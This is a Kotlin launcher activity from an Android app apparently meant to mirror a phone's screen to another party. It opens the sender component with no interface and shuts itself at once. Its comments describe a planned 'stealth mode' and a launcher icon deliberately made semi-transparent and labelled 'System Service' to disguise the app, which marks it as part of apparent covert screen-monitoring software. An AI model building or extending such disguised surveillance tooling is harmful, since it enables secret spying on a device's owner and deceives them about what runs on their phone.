package com.screenmirror.sender

import android.content.Intent
import android.os.Bundle
import android.view.View
import androidx.appcompat.app.AppCompatActivity
import com.screenmirror.sender.sender.SenderActivity

/**
 * Launcher Activity.
 *
 * In stealth mode this can be replaced with a direct service start via system events,
 * but for a usable APK we keep a minimal launcher that immediately routes to SenderActivity.
 *
 * The launcher icon is intentionally semi-transparent and labeled as "System Service".
 */
class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // Immediately route to sender activity, no UI
        startActivity(Intent(this, SenderActivity::class.java))
        finish()
    }
}
